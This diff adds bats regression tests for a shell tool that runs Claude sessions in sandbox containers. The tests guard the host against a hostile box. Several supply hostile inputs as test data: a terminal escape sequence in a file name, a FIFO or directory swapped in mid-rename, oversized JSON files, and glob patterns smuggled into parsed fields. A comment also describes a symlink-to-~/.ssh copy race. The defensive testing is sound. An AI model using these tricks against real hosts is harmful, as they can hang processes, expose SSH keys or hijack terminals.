+@test "regression v1.5.4: the session trash sweep never prints a box-chosen file name raw" {
+  local esc sdir tdir u="11111111-1111-2222-3333-444444444444"
+  esc="$(printf '\033')"
+  sdir="$HOME/.claude/projects/proj-deadbeef"
+  mkdir -p "$sdir"
+  tdir="$(_sessions_trash_dir "$sdir")"
+  mkdir -p "$tdir/1-$u"
+  _c14_bsd_rm "$TEST_TEMP/bsdrm" "1-$u"
+  PATH="$TEST_TEMP/bsdrm:$PATH" run _sessions_trash_sweep "$sdir"
+  assert_success
+  refute_output --partial "${esc}]0;PWN"
+  refute_output --partial "gone-NAME"
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: the sibling identity scan skipped a pinned box's file and nothing
+# else. When the name drop is deferred (a Claude started in the box after the
+# live gate), the box is already unpinned and its file still holds the removed
+# or left account's oauthAccount, flagged .identity-stale for the next launch.
+# The scan never read that flag, and a running Claude keeps the file's mtime
+# newest, so every box built on the shared login in another project took that
+# account's email and organisation. `cleat account rm` also unpinned before it
+# flagged, so a box built between the unpin and the drop took the name even
+# when the drop was not deferred, and a remove cut off in that gap left the
+# name unflagged for good.
+# ─────────────────────────────────────────────────────────────────────────────
+
+# Box A in one project pinned to `work` through the real switch, its file
+# naming work@example.com and newer than an unpinned sibling's shared login.
+# Leaves the box detached and running. The caller says whether a Claude runs.
+_c18_setup() {
+  command -v jq >/dev/null || skip "needs jq"
+  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
+  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
+  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
+  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
+  mkdir -p "$CLEAT_ACCOUNTS_DIR" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR" "$CLEAT_PROJECTS_DIR"
+  _CLEAT_NOW_S=1789000000
+  curl() { cat >/dev/null 2>&1; return 7; }
+  _account_usage_fetch() { return 0; }
+  mkdir -p "$CLEAT_ACCOUNTS_DIR/work" "$TEST_TEMP/proj-a"
+  chmod 700 "$CLEAT_ACCOUNTS_DIR/work"
+  printf '{"claudeAiOauth":{"accessToken":"a-token","refreshToken":"r-token","expiresAt":1789003600000,"subscriptionType":"max"}}\n' \
+    > "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
+  chmod 600 "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
+  _daemon_up() { return 1; }
+  container_exists() { return 1; }
+  _box_has_live_agent() { return 1; }
+  _C18_PA="$TEST_TEMP/proj-a"
+  _C18_CA="$(container_name_for "$_C18_PA" main)"
+  run _account_do_switch work main "$_C18_CA" "$_C18_PA"
+  assert_success
+  # The pin carries the key, the only way the remove reaches A's file.
+  run _box_account_key "$_C18_CA"
+  assert_success
+  _C18_FA="$CLEAT_PROJECTS_DIR/$(_derive_project_session_key "$_C18_PA" main)/claude.json"
+  _C18_FS="$CLEAT_PROJECTS_DIR/shared-22222222/claude.json"
+  _C18_OUT="$CLEAT_PROJECTS_DIR/third-33333333/claude.json"
+  mkdir -p "${_C18_FA%/*}" "${_C18_FS%/*}"
+  printf '{"oauthAccount":{"emailAddress":"work@example.com"},"userID":"abc","hasCompletedOnboarding":true}\n' > "$_C18_FA"
+  printf '{"oauthAccount":{"emailAddress":"shared@example.com"},"hasCompletedOnboarding":true}\n' > "$_C18_FS"
+  # A is the NEWEST, so it wins the scan unless something skips it.
+  touch -t 202601010101.01 "$_C18_FS"
+  touch -t 202601010202.02 "$_C18_FA"
+  printf '{"projects":{}}\n' > "$HOME/.claude.json"
+  _daemon_up() { return 0; }
+  container_exists() { return 0; }
+  is_running() { return 0; }
+  # No live agent when the gates ask, so the switch and the remove go ahead.
+  _box_has_live_agent() { return 1; }
+  _account_box_ready() { return 0; }
+}
+
+# What a box built on the shared login in a third project is stamped with.
+_c18_third_email() {
+  _build_project_claude_json "$_C18_OUT" > /dev/null 2>&1
+  jq -r '.oauthAccount.emailAddress // "absent"' "$_C18_OUT"
+}
+
+@test "regression v1.5.4: a removed account's name never spreads from a box whose identity drop is deferred" {
+  _c18_setup
+  # A Claude started in A after the live gate, so the drop waits for it.
+  _box_claude_live() { return 0; }
+  run _account_do_remove work 1
+  assert_success
+  run _box_account_read "$_C18_CA"
+  assert_output "default"
+  run test -e "${_C18_FA}.identity-stale"
+  assert_success
+  # Never edited under a live Claude.
+  run jq -r '.oauthAccount.emailAddress' "$_C18_FA"
+  assert_output "work@example.com"
+  run _c18_third_email
+  assert_output "shared@example.com"
+}
+
+@test "regression v1.5.4: a box built while account rm is between the unpin and the drop never takes the removed account's name" {
+  _c18_setup
+  _box_claude_live() { return 1; }
+  # Another terminal builds a box in the moment after the unlock and before
+  # the drop, the window where A is unpinned and still names work.
+  eval "$(declare -f _account_invalidate_identity_key | sed '1s/_account_invalidate_identity_key/_c18_orig_inv/')"
+  _account_invalidate_identity_key() {
+    _build_project_claude_json "$_C18_OUT" > /dev/null 2>&1
+    _c18_orig_inv "$@"
+  }
+  run _account_do_remove work 1
+  assert_success
+  run jq -r '.oauthAccount.emailAddress // "absent"' "$_C18_OUT"
+  assert_output "shared@example.com"
+  # The drop still ran, and cleared the flag the remove wrote.
+  run jq -r '.oauthAccount // "absent"' "$_C18_FA"
+  assert_output "absent"
+  run test -e "${_C18_FA}.identity-stale"
+  assert_failure
+}
+
+@test "regression v1.5.4: going back to the shared login while a Claude starts in the box keeps the old account's name out of other projects" {
+  _c18_setup
+  _box_claude_live() { return 0; }
+  run _account_do_switch default main "$_C18_CA" "$_C18_PA"
+  assert_success
+  assert_output --partial "during the switch"
+  run test -e "${_C18_FA}.identity-stale"
+  assert_success
+  run _c18_third_email
+  assert_output "shared@example.com"
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: the browser claim tested the bridge file's type only BEFORE the
+# rename. The box writes the clip dir, so it could rename a FIFO or a directory
+# onto .browser-open between that test and the mv. A FIFO then reached `head`,
+# which blocked on open forever inside the watcher's command substitution with
+# its TERM trap deferred. A directory was stranded in the claim dir. The mv
+# below does the box's swap at exactly that instant, so the race is won every
+# time.
+@test "regression v1.5.4: a FIFO swapped in before the browser claim hung the watcher" {
+  local bridge="$TEST_TEMP/clip/.browser-open" claimdir="$TEST_TEMP/clipclaim"
+  mkdir -p "$TEST_TEMP/clip" "$claimdir"
+  printf 'https://example.com/x\n' > "$bridge"
+  mv() { rm -f "$bridge"; mkfifo "$bridge"; command mv "$@"; }
+  # Stubbed so a reverted fix fails fast instead of blocking on the FIFO.
+  head() { : > "$TEST_TEMP/head.called"; }
+  run _browser_claim_url "$bridge" "$claimdir"
+  unset -f mv head
+  assert_failure
+  run test -e "$TEST_TEMP/head.called"
+  assert_failure
+  run ls -A "$claimdir"
+  assert_output ""
+}
+
+@test "regression v1.5.4: a directory swapped in before the browser claim was stranded" {
+  local bridge="$TEST_TEMP/clip/.browser-open" claimdir="$TEST_TEMP/clipclaim"
+  mkdir -p "$TEST_TEMP/clip" "$claimdir"
+  printf 'https://example.com/x\n' > "$bridge"
+  mv() { rm -f "$bridge"; mkdir -p "$bridge/sub"; echo x > "$bridge/sub/f"; command mv "$@"; }
+  run _browser_claim_url "$bridge" "$claimdir"
+  unset -f mv
+  assert_failure
+  run ls -A "$claimdir"
+  assert_output ""
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: host reads of a box's per-project claude.json were unbounded. The box
+# writes that file through a read-write bind, so it picks the size, and the host
+# read it whole into a shell variable, into jq, into a .bak, into the sibling
+# scan of every other box, and padded up to it in place. Every read now goes
+# through a bounded snapshot under a cap of the host file plus a headroom. The
+# tests shrink the headroom to 1 KB so a 4 KB file stands in for a huge one.
+_c19_json_of() {  # SIZE MARKER [KEY:VALUE]: a valid JSON object of about SIZE bytes
+  local pad
+  pad="$(head -c "$1" /dev/zero | tr '\0' x)"
+  printf '{"marker":"%s",%s"pad":"%s"}\n' "$2" "${3:+$3,}" "$pad"
+}
+
+@test "regression v1.5.4: a box-sized project claude.json was read whole by the host" {
+  command -v jq >/dev/null || skip "needs jq"
+  _CLAUDE_JSON_HEADROOM_BYTES=1024
+  CLEAT_PROJECTS_DIR="$TEST_TEMP/projects"
+  local f="$CLEAT_PROJECTS_DIR/proj-11111111/claude.json"
+  mkdir -p "${f%/*}"
+  rm -f "$HOME/.claude.json"
+  _c19_json_of 4000 BOX-BLOAT-MARKER > "$f"
+  run _build_project_claude_json "$f"
+  assert_success
+  assert_output --partial "is over"
+  run test -e "${f}.bak"
+  assert_failure
+  run grep -c BOX-BLOAT-MARKER "$f"
+  assert_output "0"
+  run jq -r '.hasCompletedOnboarding' "$f"
+  assert_output "true"
+}
+
+@test "regression v1.5.4: the sibling identity scan read an oversized box file whole" {
+  command -v jq >/dev/null || skip "needs jq"
+  _CLAUDE_JSON_HEADROOM_BYTES=1024
+  CLEAT_PROJECTS_DIR="$TEST_TEMP/projects"
+  _pinned_project_keys() { printf ':'; }
+  local sib="$CLEAT_PROJECTS_DIR/sib-22222222/claude.json"
+  mkdir -p "${sib%/*}"
+  rm -f "$HOME/.claude.json"
+  _c19_json_of 4000 S '"oauthAccount":{"emailAddress":"a@example.com"}' > "$sib"
+  run _newest_sibling_identity "$CLEAT_PROJECTS_DIR/me-33333333/claude.json"
+  assert_success
+  assert_output ""
+}
+
+@test "regression v1.5.4: the in-place writer padded an oversized box file" {
+  _CLAUDE_JSON_HEADROOM_BYTES=1024
+  rm -f "$HOME/.claude.json"
+  _c19_json_of 4000 BIG > "$TEST_TEMP/dst.json"
+  cp "$TEST_TEMP/dst.json" "$TEST_TEMP/dst.orig"
+  printf '{"small":true}\n' > "$TEST_TEMP/src.json"
+  run _write_in_place "$TEST_TEMP/src.json" "$TEST_TEMP/dst.json"
+  assert_failure
+  run cmp "$TEST_TEMP/dst.json" "$TEST_TEMP/dst.orig"
+  assert_success
+}
+
+@test "regression v1.5.4: the jq-less identity drop kept unbounded output from the box jq" {
+  _hide_jq
+  _CLAUDE_JSON_HEADROOM_BYTES=1024
+  rm -f "$HOME/.claude.json"
+  _daemon_up() { return 0; }
+  is_running() { return 0; }
+  # The box's jq is the box's own binary, so it can print anything. Here it
+  # prints a valid object far past the cap.
+  docker() {
+    if [ "$1" = exec ]; then
+      cat > /dev/null
+      _c19_json_of 4000 FROM-THE-BOX
+    fi
+  }
+  local f="$TEST_TEMP/proj/claude.json"
+  mkdir -p "${f%/*}"
+  printf '{"oauthAccount":{"emailAddress":"a@example.com"},"userID":"u"}\n' > "$f"
+  cp "$f" "$TEST_TEMP/f.orig"
+  run _claude_json_drop_identity "$f" box
+  assert_failure
+  run cmp "$f" "$TEST_TEMP/f.orig"
+  assert_success
+  run bash -c 'ls -A "$1" | grep -v -e "^claude.json$"' _ "${f%/*}"
+  assert_output ""
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: the drop log is per install, so another box's bridge can rotate it
+# during this session. The report then read the new file from this session's
+# offset and missed this box's drops written before the rotation. The inode
+# captured with the offset lets it read the rotated file from the offset first.
+@test "regression v1.5.4: a hook drop log rotated by another box silenced the report" {
+  local log="$CLEAT_STATE_DIR/hook-drops.log" off ino i
+  mkdir -p "$CLEAT_STATE_DIR"
+  for i in $(seq 1 50); do
+    printf 'now\t%s\tjson\tbox-a\tmd5\t0\told\n' "$_HOOK_DROP_MARK"
+  done > "$log"
+  off="$(_path_size "$log")"
+  ino="$(_path_ino "$log")"
+  [ -n "$ino" ]
+  printf 'now\t%s\tjson\tbox-a\tmd5\t0\tthis-session\n' "$_HOOK_DROP_MARK" >> "$log"
+  mv "$log" "$log.1"
+  for i in $(seq 1 100); do
+    printf 'now\t%s\tjson\tbox-b\tmd5\t0\tsibling\n' "$_HOOK_DROP_MARK"
+  done > "$log"
+  run _maybe_report_hook_drops "$log" "$off" box-a "$ino"
+  assert_success
+  assert_output --partial "hook event from the box"
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: the fork copy ran over a tree a running box could write. cp is path
+# based on both BSD and GNU, so a box renaming a directory into a symlink to
+# ~/.ssh mid-copy had the key bytes copied into the fork as real files. Every
+# running box that can write the project is now paused around the copy.
+@test "regression v1.5.4: a box on the live tree was not paused while the fork copied it" {
+  local proj="$TEST_TEMP/project" dlog="$TEST_TEMP/order.log" own
+  mkdir -p "$proj/src"
+  echo code > "$proj/src/app.js"
+  CLEAT_FORKS_DIR="$TEST_TEMP/forks"
+  CLEAT_BOXES_DIR="$TEST_TEMP/boxes"
+  own="$(container_name_for "$proj")"
+  _daemon_up() { return 0; }
+  docker() {
+    case "$1" in
+      ps) printf '%s\n' "$own" ;;
+      inspect) printf '%s\n' "$proj" ;;
+      pause|unpause) echo "$1" >> "$dlog" ;;
+    esac
+  }
+  cp() {
+    case " $* " in *" $proj/. "*) echo cp >> "$dlog" ;; esac
+    command cp "$@"
+  }
+  run _fork_copy_tree "$proj" "$(_fork_root)/cleat-fork-test"
+  unset -f cp docker
+  assert_success
+  run cat "$dlog"
+  assert_output "pause
+cp
+unpause"
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: box-authored text was word-split with globbing on. The live account
+# switch parses probe and terminate lines the box prints, and a field like
+# /*/*/*/*/*/*/*/* made the host walk its own filesystem before any check.
+# The config editor split a caps line the same way, so a `*` in a project
+# .cleat expanded into the names of the files in the working directory, and a
+# file named docker became the docker cap.
+@test "regression v1.5.4: a probe line glob-expanded against the host filesystem" {
+  local d="$TEST_TEMP/globdir" i cap="$TEST_TEMP/probe.cap"
+  mkdir -p "$d"
+  for i in 1 2 3 4 5 6 7 8 9; do : > "$d/a$i"; done
+  printf 'hb\t1\nargs\tok\nclaude\t%s\nend\tok\n' "$d/a*" > "$cap"
+  run _handoff_parse_probe "$cap"
+  assert_failure
+  _handoff_parse_probe "$cap" || true
+  assert_equal "${#_HO_PID[@]}" 0
+}
+
+@test "regression v1.5.4: a terminate line glob-expanded against the host filesystem" {
+  local d="$TEST_TEMP/globdir" cap="$TEST_TEMP/term.cap"
+  mkdir -p "$d"
+  : > "$d/alive"
+  printf 'hb\t1\nargs\tok\npid\t7 al*\nscan\tok\nend\tok\n' > "$cap"
+  cd "$d"
+  _parse_terminate "$cap" || true
+  assert_equal "$_PT_ANY_ALIVE" 0
+}
+
+@test "regression v1.5.4: a background shell id glob-expanded against the host filesystem" {
+  local d="$TEST_TEMP/globdir"
+  mkdir -p "$d"
+  : > "$d/execA"
+  _handoff_marker_orphans() { :; }
+  _handoff_id_ok() { return 0; }
+  _handoff_marker_live_for_exec() { return 0; }
+  _box_account_read() { printf '%s' "$_ACCOUNT_DEFAULT"; }
+  _sessions_key_dir() { printf '%s' "$TEST_TEMP/sd"; }
+  _sessions_is_uuid() { return 0; }
+  _handoff_sid_has_transcript() { return 0; }
+  _handoff_tail_flags() { echo "0 0"; }
+  _handoff_last_permission_mode() { :; }
+  _resume_model_in_settings() { return 0; }
+  _HO_PID=(7); _HO_PS=(5); _HO_STATUS=(busy); _HO_WAIT=(none); _HO_KIND=(interactive)
+  _HO_EXEC=(execA); _HO_STORE=(default); _HO_SID=(d7b73579-1111-2222-3333-444455556666); _HO_VER=("")
+  _HO_ORPHANS=""
+  _HO_SHELLS=" exe*"
+  cd "$d"
+  _handoff_classify cleat-x-12345678 1 "$TEST_TEMP/proj" "$_ACCOUNT_DEFAULT"
+  assert_equal "$_HO_VERDICT" R3
+}
+
+_c19_star_project() {
+  C19_PROJ="$TEST_TEMP/starproj"
+  mkdir -p "$C19_PROJ"
+  : > "$C19_PROJ/docker"
+  printf '[caps]\n*\ngit\n' > "$C19_PROJ/.cleat"
+  cd "$C19_PROJ"
+}
+
+@test "regression v1.5.4: a star cap glob-expanded into workspace file names in the text editor" {
+  _c19_star_project
+  run _config_picker_text "$C19_PROJ/.cleat" project "$C19_PROJ" <<< $'git\ndone'
+  assert_success
+  run _read_caps_from_file "$C19_PROJ/.cleat"
+  refute_output --partial "docker"
+  refute_output --partial "git"
+}
+
+@test "regression v1.5.4: a star cap glob-expanded into workspace file names in the picker" {
+  _c19_star_project
+  # Cursor starts on the git row: SPACE turns git off, ENTER saves. The key
+  # reader runs in a command substitution, so its position lives in a file.
+  _read_keypress() {
+    local n
+    n="$(cat "$TEST_TEMP/kp" 2>/dev/null || echo 0)"
+    echo $(( n + 1 )) > "$TEST_TEMP/kp"
+    case "$n" in 0) echo SPACE ;; *) echo ENTER ;; esac
+  }
+  run _config_picker_tui "$C19_PROJ/.cleat" project "$C19_PROJ"
+  assert_success
+  run cat "$TEST_TEMP/kp"
+  assert_output "2"
+  run _read_caps_from_file "$C19_PROJ/.cleat"
+  refute_output --partial "docker"
+  refute_output --partial "git"
 }
